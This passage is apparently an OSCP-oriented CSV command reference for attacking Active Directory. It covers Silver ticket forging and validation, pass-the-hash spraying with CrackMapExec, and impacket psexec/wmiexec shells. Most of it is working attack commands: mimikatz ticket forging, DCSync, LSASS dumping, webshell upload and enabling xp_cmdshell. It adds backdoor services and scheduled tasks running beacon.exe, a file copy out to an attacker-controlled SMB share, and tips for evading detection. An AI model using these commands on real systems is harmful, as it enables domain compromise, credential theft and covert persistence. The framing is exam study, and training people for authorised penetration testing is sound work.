Principal Names in Active Directory. Available on all domain-joined Windows machines since Windows Server 2008. Requires READ permissions on AD (standard Domain Users have this). Queries the servicePrincipalName attribute of AD objects. No administrative privileges needed for read operations."", ""-Q"": ""Query mode - searches Active Directory for SPNs matching the specified pattern. Returns all matching SPNs with their associated account names (user or computer accounts). Alternative: -L <account> to list SPNs registered to specific account. -Q is more useful for Silver ticket prep because you start with target server, not service account."", ""*/<TARGET_SERVER>*"": ""SPN search pattern using wildcards. Format: service/hostname:port. The wildcard (*) before slash matches ANY service type (cifs, http, mssql, etc.). Wildcard after hostname matches partial names (e.g., 'web*' finds web01, web02, webserver). CASE-INSENSITIVE. Examples:\n- */web04* - Finds ALL services on any hostname containing 'web04'\n- http/* - Finds ALL HTTP SPNs on any server\n- mssql/sql01* - Finds SQL Server SPNs on servers starting with 'sql01'\n\nRESULT FORMAT: Displays 'Existing SPN found:' followed by service/hostname:port, then 'Registered to account: DOMAIN\\username or DOMAIN\\COMPUTERNAME$'""}","[""crackmapexec-validate-admin""]","[""powerview-enumerate-spns"", ""impacket-getuserspns-list""]","[""ad-silver-ticket-mimikatz-create"", ""ad-silver-ticket-rubeus-create""]"
"ad-silver-ticket-validate-access","Validate Silver Ticket Access to Service","active-directory","# CIFS/SMB: dir \\<TARGET_SERVER>\C$
# HTTP/IIS: Invoke-WebRequest http://<TARGET_SERVER> -UseDefaultCredentials
# MSSQL: Invoke-Sqlcmd -ServerInstance <TARGET_SERVER> -Query 'SELECT @@VERSION'
# LDAP: ldapsearch -H ldap://<TARGET_SERVER> -Y GSSAPI -b 'DC=corp,DC=com'","Test service access after Silver ticket injection to validate the forged ticket grants expected permissions. Different validation methods for different SPN service types.","kerberos-attacks","# CIFS/SMB: dir \\<web04.corp.com>\C$
# HTTP/IIS: Invoke-WebRequest http://<web04.corp.com> -UseDefaultCredentials
# MSSQL: Invoke-Sqlcmd -ServerInstance <web04.corp.com> -Query 'SELECT @@VERSION'
# LDAP: ldapsearch -H ldap://<web04.corp.com> -Y GSSAPI -b 'DC=corp,DC=com'","OSCP METHODOLOGY - VALIDATION IS MANDATORY:
After creating a Silver ticket, you MUST validate access BEFORE considering the attack successful.

Validation confirms:
1.

Ticket was constructed correctly (right hash, SID, service type)
2.

Ticket was injected properly (appears in klist AND is being used by applications)
3.

Service accepts the ticket (grants expected permissions)

Skipping validation wastes time during the exam - you may think you have access but actually don't, leading to failed exploitation attempts later.

VALIDATION WORKFLOW (30 seconds total):
1.

CREATE SILVER TICKET:
   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt

2.

VERIFY TICKET IN CACHE (5 seconds):
   klist
   Expected output:
   Server:
http/web04.corp.com @ CORP.COM
   KerbTicket Encryption Type:
RSADSI RC4-HMAC(NT)

3.

VALIDATE SERVICE ACCESS (10-15 seconds, depending on service type):
   
   FOR HTTP SPN:
   Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials
   SUCCESS:
StatusCode = 200, Content populated
   FAILURE:
401/403 status, or credential prompt

   FOR CIFS SPN:
   dir \\web04.corp.com\C$
   SUCCESS:
Directory listing of C:\ drive
   FAILURE:
Access denied, logon failure

   FOR MSSQL SPN:
   Invoke-Sqlcmd -ServerInstance web04.corp.com -Query 'SELECT @@VERSION'
   SUCCESS:
SQL version string returned
   FAILURE:
Login failed, server not found

4.

DOCUMENT SUCCESS:
   - Record which services are accessible
   - Note any failures for troubleshooting
   - Proceed with exploitation (webshell upload, file exfiltration, xp_cmdshell, etc.)

SERVICE-SPECIFIC VALIDATION COMMANDS:
1.

CIFS / FILE SHARES (most common):
   # List administrative shares:
   net view \\<server> /all
   
   # Access specific share:
   dir \\<server>\C$
   dir \\<server>\ADMIN$
   
   # Copy file (test write access):
   echo test > \\<server>\C$\test.txt
   
   # PowerShell alternatives:
   Get-ChildItem \\<server>\C$
   Test-Path \\<server>\C$\Windows (verify path exists)
   
   EXPECTED RESULT:
Full directory listings, file operations succeed
   TROUBLESHOOTING:
If access denied, verify cifs ticket exists (klist | findstr cifs)

2.

HTTP / IIS WEB SERVERS:
   # PowerShell web request:
   Invoke-WebRequest http://<server> -UseDefaultCredentials
   
   # Test specific path:
   Invoke-WebRequest http://<server>/admin -UseDefaultCredentials
   
   # Download file:
   Invoke-WebRequest http://<server>/data.xml -OutFile data.xml -UseDefaultCredentials
   
   # curl alternative (if PowerShell restricted):
   curl --negotiate -u :
http://<server>
   
   EXPECTED RESULT:
HTTP 200, content retrieved, no auth prompts
   TROUBLESHOOTING:
If 401/403, ensure FQDN in URL and http ticket in cache

3.

MSSQL / SQL SERVER:
   # PowerShell (requires SqlServer module):
   Import-Module SqlServer
   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT @@VERSION'
   
   # Test xp_cmdshell (if enabled):
   Invoke-Sqlcmd -ServerInstance <server> -Query 'EXEC xp_cmdshell ""whoami""'
   
   # List databases:
   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT name FROM sys.databases'
   
   # sqlcmd.exe alternative (cmd-line tool):
   sqlcmd -S <server> -Q ""SELECT @@VERSION""
   
   EXPECTED RESULT:
Query results returned, no login failures
   TROUBLESHOOTING:
If login failed, verify mssql ticket and SQL user mapping

4.

LDAP / DOMAIN CONTROLLERS:
   # PowerShell AD cmdlets (automatically use cached ticket):
   Get-ADUser -Server <server> -Filter *
   Get-ADComputer -Server <server> -Filter *
   
   # LDAP query:
   ([adsisearcher]""(&(objectCategory=person)(objectClass=user))"").FindAll()
   
   # Linux ldapsearch:
   ldapsearch -H ldap://<server> -Y GSSAPI -b 'DC=corp,DC=com' '(objectClass=*)'
   
   EXPECTED RESULT:
AD objects returned, no credential errors
   TROUBLESHOOTING:
Rare for Silver tickets (use Golden for DC access), verify ldap ticket

5.

HOST / GENERIC SERVICES:
   # WMI query (tests RPC access):
   Get-WmiObject -Class Win32_OperatingSystem -ComputerName <server>
   
   # Create scheduled task (tests remote admin):
   schtasks /create /tn test /tr calc.exe /sc once /st 23:00 /S <server>
   
   # Remote service enumeration:
   Get-Service -ComputerName <server>
   
   EXPECTED RESULT:
WMI data returned, tasks created, services listed
   TROUBLESHOOTING:
Host ticket is broad (covers multiple protocols), check specific errors

6.

WSMAN / POWERSHELL REMOTING:
   # Enter remote PS session:
   Enter-PSSession -ComputerName <server>
   
   # Execute remote command:
   Invoke-Command -ComputerName <server> -ScriptBlock { whoami }
   
   # Test WinRM connectivity:
   Test-WSMan <server>
   
   EXPECTED RESULT:
Remote session established, commands execute
   TROUBLESHOOTING:
Verify wsman ticket, check WinRM enabled on target (port 5985/5986)

COMMON VALIDATION MISTAKES:
1.

 Using NetBIOS name instead of FQDN:
   WRONG:
dir \\WEB04\C$ (triggers NTLM, ignores Kerberos ticket)
   RIGHT:
dir \\WEB04.corp.com\C$ (triggers Kerberos, uses ticket)

2.

 Omitting -UseDefaultCredentials for HTTP:
   WRONG:
Invoke-WebRequest http://web04.corp.com (may not use ticket)
   RIGHT:
Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials (forces ticket use)

3.

 Testing wrong service type:
   WRONG:
Created http ticket, testing SMB access (dir \\server\C$)
   RIGHT:
Created http ticket, testing HTTP access (Invoke-WebRequest http://server)

4.

 Not checking klist first:
   WRONG:
Assume ticket injection worked, proceed to validation (wastes time if injection failed)
   RIGHT:
Run klist BEFORE validation (confirms ticket exists and is correct type)

5.

 Giving up after first failure:
   WRONG:
Access denied  assume Silver ticket doesn't work
   RIGHT:
Troubleshoot systematically (check service type, hostname format, hash validity, SID correctness)

TROUBLESHOOTING DECISION TREE:
VALIDATION FAILED?
 Ticket not in klist?
   /ptt failed  Re-run Mimikatz with privilege::debug first
   Ticket creation failed  Check syntax, required parameters

 Ticket in klist but access denied?
   Check service type match (cifs ticket for SMB, http ticket for web, etc.)
   Verify hostname format (FQDN required for Kerberos)
   Test hash validity (crackmapexec smb <dc> -u <account> -H <hash>)
   Verify Domain SID correctness (whoami /user, remove RID)

 Credential prompt appears?
   Application not using Kerberos  Use FQDN, add -UseDefaultCredentials
   Service prefers NTLM  Check SPN registration (setspn -Q)
   Hostname format wrong  Match ticket hostname exactly

 Specific error codes?
    KRB_AP_ERR_MODIFIED  Wrong hash or Domain SID
    KRB_AP_ERR_NOT_US  Domain mismatch or wrong target hostname
    Server not found  Hostname typo or DNS resolution failure
    PAC validation error  Service has PAC validation enabled (Silver won't work)

POST-VALIDATION NEXT STEPS:
Once validation succeeds, proceed with exploitation:
1.

CIFS ACCESS:
   - Copy payload:
copy beacon.exe \\server\C$\Windows\Temp\
   - PsExec:
psexec.exe \\server cmd.exe
   - Create service:
sc \\server create backdoor binpath= ""C:\Windows\Temp\beacon.exe""
   - Scheduled task:
schtasks /create /tn backdoor /tr ""C:\Windows\Temp\beacon.exe"" /sc onstart /S server

2.

HTTP ACCESS:
   - Upload webshell:
Invoke-WebRequest -Uri http://server/upload -Method POST -InFile shell.aspx -UseDefaultCredentials
   - Access admin panel:
http://server/admin (use ticket for auth)
   - Exploit web vuln:
Use ticket to bypass auth, then exploit SQLi/RCE/LFI

3.

MSSQL ACCESS:
   - Enable xp_cmdshell:
Invoke-Sqlcmd -Query ""EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE""
   - Execute commands:
Invoke-Sqlcmd -Query ""EXEC xp_cmdshell 'whoami'""
   - Escalate to SYSTEM:
xp_cmdshell runs as SQL Server service account (often high-privilege)

4.

LDAP ACCESS (rare for Silver, common for Golden):
   - Enumerate AD:
Get-ADUser -Filter * -Server <dc>
   - Modify AD objects (if permissions allow):
Set-ADUser, Add-ADGroupMember
   - DCSync:
mimikatz # lsadump::dcsync /domain:corp.com /all (requires Replication rights)

TIME BUDGET FOR OSCP EXAM:
- Ticket creation:
1 minute
- klist verification:
5 seconds
- Service validation:
10-30 seconds (depending on service type)
- Troubleshooting (if needed):
2-5 minutes (systematic approach)
- TOTAL:
3-7 minutes from ticket creation to confirmed access

If validation takes longer than 7 minutes, consider alternative attack paths (Pass-the-Hash, legitimate credentials, different vulnerability).

FINAL OSCP EXAM TIP:
CREATE A VALIDATION CHECKLIST:
1.

[ ] klist shows ticket for correct service type (Server:
<service>/<target>)
2.

[ ] Ticket encryption type is RC4-HMAC(NT) or AES (depending on /rc4 or /aes256)
3.

[ ] FQDN used in validation command (not NetBIOS name)
4.

[ ] Service-specific validation command executed (dir for cifs, iwr for http, etc.)
5.

[ ] SUCCESS:
Access granted without credential prompt
6.

[ ] FAILURE:
Troubleshoot systematically (service type, hostname, hash, SID)

This checklist prevents common mistakes and ensures thorough validation before proceeding with exploitation.","high","","","","{""Access denied despite ticket in cache (klist shows ticket)"": ""DIAGNOSIS: Wrong service type in Silver ticket OR ticket not being used by application. SOLUTIONS:\n\n1. VERIFY SERVICE TYPE MATCH:\n   - CIFS access requires cifs/ SPN ticket (NOT http/)\n   - HTTP access requires http/ SPN ticket (NOT cifs/)\n   - Run: klist | findstr <target_server> to see which service type you have\n   - If mismatch, recreate ticket with correct /service parameter\n\n2. VERIFY HOSTNAME FORMAT:\n   - Application may use different hostname format than ticket\n   - If ticket is for 'web04.corp.com' but you access 'http://web04', mismatch occurs\n   - FIX: Use EXACT hostname from ticket (klist shows Server: field)\n   - Example: If ticket shows http/web04.corp.com, access http://web04.corp.com (FQDN)\n\n3. FORCE KERBEROS AUTHENTICATION:\n   - Some applications prefer NTLM over Kerberos\n   - For HTTP: Add -UseDefaultCredentials AND ensure URL uses FQDN\n   - For SMB: Use FQDN path (\\\\server.corp.com\\share instead of \\\\server\\share)\n   - For SQL: Use FQDN in ServerInstance (-ServerInstance server.corp.com)\n\n4. CHECK TICKET FLAGS:\n   - Run: klist | Select-String -Pattern 'Ticket Flags'\n   - Should show: 0x40a00000 (forwardable, renewable, pre_authent)\n   - If flags are wrong, ticket may not be accepted by service"", ""Application prompts for credentials instead of using cached ticket"": ""DIAGNOSIS: Application is not configured to use Kerberos, or hostname format triggers NTLM. SOLUTIONS:\n\n1. USE FQDN EVERYWHERE:\n   - WRONG: dir \\\\WEB04\\C$ (NetBIOS, triggers NTLM)\n   - RIGHT: dir \\\\WEB04.corp.com\\C$ (FQDN, triggers Kerberos)\n   - Windows determines auth method based on hostname format (NetBIOS=NTLM, FQDN=Kerberos)\n\n2. VERIFY SERVICE IS KERBEROS-ENABLED:\n   - Check IIS config: IIS Manager \u2192 Authentication \u2192 Windows Auth \u2192 Providers (should include Negotiate/Kerberos)\n   - Check SQL config: SQL Server Configuration Manager \u2192 Network Configuration \u2192 TCP/IP enabled, SPNs registered\n   - Some services are NTLM-only (Kerberos Silver ticket won't work, use Pass-the-Hash instead)\n\n3. ADD HOST TO TRUSTED SITES (HTTP/IIS specific):\n   - If accessing web app, IE/Edge may require hostname in trusted sites for Kerberos\n   - PowerShell equivalent: Set-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\corp.com' -Value 2\n   - Alternative: Use -UseDefaultCredentials flag in Invoke-WebRequest (bypasses zone check)"", ""HTTP validation: NTLM challenge instead of Kerberos (ticket ignored)"": ""DIAGNOSIS: Web server prefers NTLM over Kerberos, or SPN not registered. SOLUTIONS:\n\n1. VERIFY HTTP SPN EXISTS:\n   - Run: setspn -Q http/<target_server>\n   - If no HTTP SPN registered, IIS falls back to NTLM\n   - FIX (if admin on IIS server): setspn -S http/<fqdn> <service_account>\n\n2. FORCE KERBEROS IN IIS (if you have admin access):\n   - IIS Manager \u2192 Server \u2192 Authentication \u2192 Windows Authentication \u2192 Providers\n   - Move 'Negotiate:Kerberos' to TOP of list (above NTLM)\n   - Remove NTLM if Kerberos-only desired\n\n3. USE FQDN IN URL:\n   - WRONG: http://web04 (may use NTLM)\n   - RIGHT: http://web04.corp.com (prefers Kerberos)\n\n4. CHECK TICKET IS FOR HTTP SERVICE:\n   - Run: klist | findstr http\n   - Should show: Server: http/web04.corp.com @ CORP.COM\n   - If missing, recreate Silver ticket with /service:http"", ""MSSQL validation: Login failed even with valid ticket"": ""DIAGNOSIS: SQL Server not trusting Kerberos ticket, or user not mapped in SQL. SOLUTIONS:\n\n1. VERIFY MSSQL SPN REGISTRATION:\n   - Run: setspn -L <sql_service_account> OR setspn -Q mssql/*\n   - Expected: MSSQLSvc/<hostname>:1433 or MSSQLSvc/<hostname>:InstanceName\n   - If missing, SQL Server may reject Kerberos auth\n\n2. CHECK SQL SERVER AUTHENTICATION MODE:\n   - SQL must allow Windows Authentication (not SQL-only mode)\n   - Connect with SSMS \u2192 Server Properties \u2192 Security \u2192 'Windows Authentication mode' enabled\n\n3. SQL USER MAPPING:\n   - Silver ticket impersonates user (e.g., /user:admin)\n   - This user must exist as SQL login: CREATE LOGIN [CORP\\admin] FROM WINDOWS\n   - OR if using fictional user, SQL Server may reject (depends on PAC validation)\n   - FIX: Use real domain admin account name in /user parameter\n\n4. VERIFY HOSTNAME FORMAT:\n   - WRONG: Invoke-Sqlcmd -ServerInstance SQL01 (NetBIOS, may trigger NTLM)\n   - RIGHT: Invoke-Sqlcmd -ServerInstance SQL01.corp.com (FQDN, Kerberos)\n   - Alternative: Invoke-Sqlcmd -ServerInstance SQL01.corp.com,1433 (specify port)"", ""Ticket shows in klist but all access methods fail"": ""DIAGNOSIS: Fundamental Silver ticket creation issue (wrong hash, wrong SID, or PAC validation enabled). SOLUTIONS:\n\n1. VERIFY NTLM HASH IS CURRENT:\n   - Service account password may have changed\n   - Test hash validity: crackmapexec smb <dc_ip> -u <service_account> -H <ntlm_hash>\n   - If invalid, re-obtain hash (Kerberoast, DCSync, LSASS dump)\n\n2. VERIFY DOMAIN SID IS CORRECT:\n   - Run: whoami /user \u2192 Extract Domain SID (remove last segment)\n   - Compare with /sid parameter used in Silver ticket creation\n   - Mismatch causes KRB_AP_ERR_MODIFIED\n\n3. CHECK FOR PAC VALIDATION (rare but fatal):\n   - Modern Windows (Oct 2022 patch KB5020805) enforces PAC validation\n   - If enabled, service validates ticket with DC (verifies user exists, groups are legitimate)\n   - Silver tickets FAIL PAC validation (forged PAC doesn't match DC records)\n   - DIAGNOSIS: Event ID 4769 on DC shows PAC validation request\n   - SOLUTION: Silver tickets won't work if PAC validation enabled - use legitimate credentials or Golden ticket instead\n\n4. RECREATE TICKET WITH VERBOSE LOGGING:\n   - Mimikatz: Run with 'log <filename>.txt' first, then kerberos::golden\n   - Review log for errors during ticket construction\n   - Rubeus: Outputs detailed construction steps by default ([*] Building PAC, [*] Signing PAC, etc.)\n   - Look for errors during PAC generation or encryption""}","{""dir \\\\<SERVER>\\C$"": ""VALIDATES: cifs SPN (file share access). Tests access to administrative share C$ (requires admin rights, which Silver ticket grants via forged PAC Domain Admins membership). SUCCESS: Directory listing of C:\\ drive. FAILURE: 'Access is denied' or 'Logon failure'. Alternative shares to test: ADMIN$ (Windows directory), IPC$ (named pipes), custom shares. PowerShell alternative: Get-ChildItem \\\\<server>\\C$. TIME: <2 seconds."", ""Invoke-WebRequest -UseDefaultCredentials"": ""VALIDATES: http SPN (web application access). -UseDefaultCredentials flag instructs PowerShell to use Kerberos ticket from cache (the injected Silver ticket). Without this flag, web request may prompt for credentials or fail. SUCCESS: HTTP 200 status code, content retrieved. FAILURE: 401 Unauthorized, 403 Forbidden, or connection timeout. Alternative: Invoke-RestMethod (for REST APIs), curl (Linux), or browser (navigate to http://<server> while ticket is cached). TIME: <5 seconds (depends on web app response time)."", ""Invoke-Sqlcmd -Query 'SELECT @@VERSION'"": ""VALIDATES: mssql SPN (SQL Server access). Requires SqlServer PowerShell module (Import-Module SqlServer). -ServerInstance specifies SQL Server hostname (uses Kerberos authentication automatically if ticket in cache). 'SELECT @@VERSION' is simple query to test connectivity (returns SQL Server version string). SUCCESS: Query executes, version string returned. FAILURE: 'Login failed for user', 'Server not found', or timeout. Alternative: sqlcmd.exe (cmd-line tool), xp_cmdshell tests (if you want to validate RCE capability). TIME: <5 seconds."", ""ldapsearch -Y GSSAPI"": ""VALIDATES: ldap SPN (directory services access). Linux-based validation using ldapsearch (part of ldap-utils package). -Y GSSAPI enables GSSAPI authentication (Kerberos). -b 'DC=corp,DC=com' specifies base DN for search. SUCCESS: LDAP query returns directory objects. FAILURE: 'GSSAPI Error', 'Invalid credentials', or 'Server not found'. Windows alternative: PowerShell AD cmdlets (Get-ADUser, Get-ADComputer) automatically use cached Kerberos ticket. TIME: <5 seconds.""}","[""ad-silver-ticket-mimikatz-create"", ""kerberos-klist-verify""]","","[""evil-winrm-creds""]"
"ad-pass-the-hash-crackmapexec","Pass-the-Hash with CrackMapExec (Spray Multiple Targets)","post-exploit","crackmapexec smb <TARGET_RANGE> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN>","Test NTLM hash against multiple targets simultaneously to identify where the user has administrative access. Shows 'Pwn3d!' for systems where hash grants admin rights. FASTEST method for lateral movement discovery.","active-directory","crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com","CrackMapExec is ESSENTIAL for OSCP lateral movement. The 'Pwn3d!' indicator is your green light for command execution. WORKFLOW: (1) DCSync/dump hashes, (2) Spray with CME to find admin access, (3) Execute commands on 'Pwn3d!' systems with psexec/wmiexec, (4) Dump LSASS for more creds, (5) Repeat. Time estimate: 5-30 seconds for /24 subnet spray.

COMMON MISTAKES:
- Using full hash output with colons (use only NTLM portion: 32 hex chars)
- Including domain prefix in username (use -d flag separately)
- Not documenting 'Pwn3d!' systems (you'll forget which hosts grant access)
- Assuming [-] means failure (could be non-admin auth, still valuable for enumeration)

ADVANCED USAGE:
Command execution: crackmapexec smb <TARGET> -u <USER> -H <HASH> -x 'whoami'
Module usage: crackmapexec smb <TARGET> -u <USER> -H <HASH> -M lsassy (dump LSASS)
Database: crackmapexec smb <TARGET> -u <USER> -H <HASH> --log (stores in CME database)

TIME ESTIMATE: 10-60 seconds for /24 subnet (parallelized), 2-5 seconds per single host","high","","","","{""STATUS_LOGON_FAILURE"": ""Verify hash is correct 32-character NTLM (not LM or full output). Verify username spelling (case-insensitive but must match account name). Verify domain name matches NetBIOS or FQDN. Test hash with single known-good target first: crackmapexec smb <DC_IP> -u <USER> -H <HASH> -d <DOMAIN>."", ""STATUS_ACCESS_DENIED but authentication succeeds"": ""Hash is valid but user lacks local admin rights on this system. This is EXPECTED for most targets. Only systems showing 'Pwn3d!' are exploitable. Document systems where authentication works (potential targets if user's privileges increase)."", ""Connection timeout or host unreachable"": ""SMB port 445 blocked by firewall. Verify with: sudo nmap -p 445 -Pn <TARGET>. Alternative: Try WinRM if enabled: crackmapexec winrm <TARGET> -u <USER> -H <HASH>. Check ARP table for MAC address (layer 2 issue): arp -a."", ""STATUS_ACCOUNT_LOCKED_OUT"": ""Too many failed login attempts triggered account lockout policy. Wait for lockout duration (default 30 minutes). Check policy: crackmapexec smb <DC_IP> -u <USER> -p <PASS> --pass-pol. Alternative: Use different account or request unlock from domain admin.""}","{""crackmapexec smb"": ""CrackMapExec SMB module for authentication testing and lateral movement. Rapid parallel execution across multiple targets. Essential for OSCP post-exploitation. Alternatives: crackmapexec winrm (WinRM), crackmapexec ssh (SSH)."", ""<TARGET_RANGE>"": ""Target specification. Single IP: 192.168.50.75. CIDR range: 192.168.50.0/24 (tests entire subnet). Hostname: DC1.corp.com. File input: -M targets.txt (one host per line). IP range: 192.168.50.70-80."", ""-u <USERNAME>"": ""Username for authentication. Do NOT include domain prefix (use -d flag instead). Local admin: 'Administrator'. Domain user: 'dave'. Service account: 'sqlsvc'. Case-insensitive for Windows targets."", ""-H <NTLM_HASH>"": ""NTLM hash for Pass-the-Hash authentication. Must be exactly 32 hexadecimal characters. Extract from DCSync/SAM dump output. Format: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH, use only the second half (after colon). Do NOT include LM hash or colons."", ""-d <DOMAIN>"": ""Domain for authentication. NetBIOS name: 'CORP'. FQDN also accepted: 'corp.com'. For local authentication (non-domain), use '.' (period). Omitting this flag attempts local authentication by default.""}","","[""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-impacket-wmiexec""]","[""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-impacket-wmiexec"", ""ad-lsass-dump-procdump""]"
"ad-pass-the-hash-impacket-psexec","Pass-the-Hash with Impacket PsExec (Remote Shell)","post-exploit","impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>","Execute commands or spawn interactive shell on remote Windows system using Pass-the-Hash. Uploads binary to ADMIN$ share and creates Windows service for execution. Grants SYSTEM-level access (highest privilege).","active-directory","impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75","Impacket-psexec is the PRIMARY lateral movement tool after obtaining NTLM hashes. ADVANTAGES: (1) No password needed (hash-only authentication), (2) Grants SYSTEM privileges (higher than user's normal rights), (3) Works from Kali without Windows access. DISADVANTAGES: (1) Writes binary to disk (AV may detect), (2) Creates Windows service (logged in Event ID 7045), (3) Requires ADMIN$ write access.

OSCP WORKFLOW:
1. DCSync or dump hashes: impacket-secretsdump '<DOMAIN>/<DA>:<PASS>@<DC>'
2. Test hash validity: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')
3. Spawn shell: impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>
4. Dump LSASS: procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
5. Download dump: download C:\Users\Public\lsass.dmp /tmp/lsass.dmp
6. Parse locally: pypykatz lsa minidump /tmp/lsass.dmp
7. Repeat with new credentials

STEALTH ALTERNATIVES:
- impacket-wmiexec: Uses WMI for execution (no service creation, stealthier)
- impacket-smbexec: Writes to C$ or other writable share (not ADMIN$)
- impacket-atexec: Uses Task Scheduler (less common IOC)

COMMON MISTAKES:
- Forgetting colon before NTLM hash in -hashes flag (correct: -hashes :HASH)
- Using IP when Kerberos required (use FQDN for Kerberos: CLIENT75.corp.com)
- Not checking 'Pwn3d!' status first (wastes time on failed connections)
- Using on domain controller (use wmiexec instead - less IOCs)

TIME ESTIMATE: 5-15 seconds for connection establishment, instant shell thereafter","high","","","","{""STATUS_LOGON_FAILURE"": ""Verify NTLM hash is exactly 32 hexadecimal characters (no spaces, colons, or extra characters). Verify username spelling matches AD account (case-insensitive). Verify domain name: Use NetBIOS ('CORP') or FQDN ('corp.com'). Test authentication with smbclient first: smbclient -U '<DOMAIN>/<USER>%<HASH>' --pw-nt-hash //<TARGET>/C$."", ""STATUS_ACCESS_DENIED (authenticated but not admin)"": ""User credentials are VALID but account lacks local administrator rights on target system. Verify user is in local Administrators group OR domain group with admin rights. Test with CrackMapExec first to verify 'Pwn3d!' status: crackmapexec smb <TARGET> -u <USER> -H <HASH> -d <DOMAIN>. If shows [+] but not 'Pwn3d!', user is authenticated but NOT admin."", ""ADMIN$ share is not writable"": ""POSSIBLE CAUSES: (1) User is not local admin (most common - verify group membership). (2) ADMIN$ administrative share disabled by GPO (rare, check with: net share \\\\<TARGET>). (3) Antivirus blocking write to ADMIN$ (uncommon). SOLUTION: Try alternative tools that don't require ADMIN$ write: impacket-wmiexec (uses DCOM/WMI, no file write). Or: impacket-smbexec (writes to writable share, not ADMIN$)."", ""Connection refused / Connection timeout"": ""SMB port 445 is blocked by firewall or target is offline. VERIFY: sudo nmap -p 445 -Pn <TARGET> (should show 'open'). ALTERNATIVES: If WinRM enabled (port 5985/5986), use evil-winrm: evil-winrm -i <TARGET> -u <USER> -H <HASH>. If RDP enabled and password cracked, use xfreerdp. Check host is reachable: ping <TARGET>.""}","{""impacket-psexec"": ""Impacket's implementation of Sysinternals PsExec tool. Creates Windows service on target for remote code execution. Uploads RemComSvc binary to ADMIN$ share, creates service, executes commands, returns output. Grants NT AUTHORITY\\SYSTEM context (highest privilege). Alternative: impacket-smbexec (no file write), impacket-wmiexec (stealthier, no service)."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication flag. Colon before NTLM hash means 'use empty LM hash' (standard for modern Windows). Format: -hashes LM:NTLM. Modern Windows disables LM hashing, so use -hashes :<NTLM> (colon prefix with empty LM). Full format for old systems: -hashes aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494 (first part is blank LM hash constant)."", ""<DOMAIN>/<USERNAME>"": ""Authentication credentials in DOMAIN/USER format. Domain: NetBIOS name ('CORP') or FQDN ('corp.com'). For local accounts on non-domain systems, use hostname or '.' as domain. Username: Account with local admin rights. Combine: corp.com/dave or CORP/Administrator."", ""@<TARGET>"": ""Target system identifier. IP address: Fast, works with NTLM authentication (192.168.50.75). FQDN: Required for Kerberos authentication (CLIENT75.corp.com). IMPORTANT: Use FQDN if domain uses Kerberos exclusively. Use IP for speed and NTLM fallback in OSCP environments.""}","","[""ad-pass-the-hash-impacket-wmiexec"", ""ad-pass-the-hash-crackmapexec""]","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""windows-search-sensitive-files""]"
"ad-pass-the-hash-impacket-wmiexec","Pass-the-Hash with Impacket WMIExec (Stealthy Shell)","post-exploit","impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>","Execute commands on remote system via WMI using Pass-the-Hash. STEALTHIER than psexec - no service creation, no file writes to ADMIN$. Uses DCOM for semi-interactive shell. RECOMMENDED for domain controllers and high-security targets.","active-directory","impacket-wmiexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75","WMIExec is the RECOMMENDED method for stealthy lateral movement in OSCP. WHEN TO USE: (1) Targeting domain controllers (less forensic footprint), (2) ADMIN$ share is disabled/blocked, (3) AV detects psexec service creation, (4) Need to avoid Event ID 7045 (service creation) alerts.

STEALTH COMPARISON:
PsExec: Writes binary (RemComSvc.exe) to ADMIN$, creates service (Event 7045), deletes after. HIGH IOC.
WMIExec: No file write, no service, uses existing WMI infrastructure. MEDIUM IOC (Event 4648, 4624 Type 3).
SMBExec: Writes batch file to C$ or other writable share, executes via service. MEDIUM IOC.
AtExec: Uses Task Scheduler (schtasks.exe), creates scheduled task. LOW IOC (uncommon technique).

OSCP WORKFLOW:
1. Obtain NTLM hash (DCSync or dump)
2. Verify admin access: crackmapexec smb <TARGET> -u <USER> -H <HASH> (look for 'Pwn3d!')
3. Spawn shell: impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>
4. Execute commands: whoami, net user, reg query, etc.
5. Dump SAM/LSASS for additional credentials
6. Download files via SMB: copy <FILE> \\<ATTACKER_IP>\share\
7. Lateral movement to next system

COMMON MISTAKES:
- Expecting fully interactive shell (it's SEMI-interactive, slower response than psexec)
- Using wmiexec when psexec would work (wmiexec is slower, use when stealth needed)
- Not opening required firewall ports (135 + dynamic high ports 49152-65535)
- Forgetting colon before NTLM hash in -hashes flag

PERFORMANCE:
- Slower than psexec (each command creates new WMI process)
- Output may be delayed (1-3 seconds per command)
- Large file operations are SLOW (use SMB copy instead)
- Interactive programs (like mimikatz) don't work well (use one-line commands)

BEST PRACTICES:
- Use FQDN on domain controllers for Kerberos authentication (stealthier)
- One-line commands work best: type C:\Users\Public\passwords.txt
- For file transfers, use SMB: impacket-smbserver share /tmp -smb2support
- Combine with procdump for LSASS: procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp

